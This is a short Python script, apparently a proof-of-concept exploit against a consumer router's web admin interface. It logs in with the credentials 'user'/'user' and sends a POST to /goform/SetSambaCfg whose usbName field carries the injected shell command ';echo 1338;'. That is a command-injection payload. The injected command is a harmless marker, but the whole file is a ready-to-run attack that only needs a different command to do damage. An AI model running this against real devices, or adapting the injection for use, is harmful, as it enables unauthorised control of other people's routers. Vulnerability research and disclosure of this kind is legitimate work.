#!/usr/bin/env python3

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
t.post_request('/goform/SetSambaCfg', 'action=del&usbName=;echo 1338;')
